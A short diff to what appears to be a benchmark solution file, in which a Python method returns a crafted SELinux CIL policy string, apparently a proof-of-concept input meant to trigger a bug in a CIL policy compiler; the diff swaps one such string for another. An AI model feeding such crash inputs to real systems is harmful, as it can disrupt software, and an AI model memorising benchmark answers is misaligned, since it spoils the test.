@@ -1,9 +1,4 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = """(class file (read))
-(permission read)
-(macro foo ((c classpermission))
-  (classpermissionset bar c)
-)
-(foo (classpermission (file read)))"""
-        return poc.encode('utf-8')
+        poc = "(class file (read))(macro test ((classperm cp))(classpermissionset myset cp))(test ((classpermspec file (read))))"
+        return poc.encode()
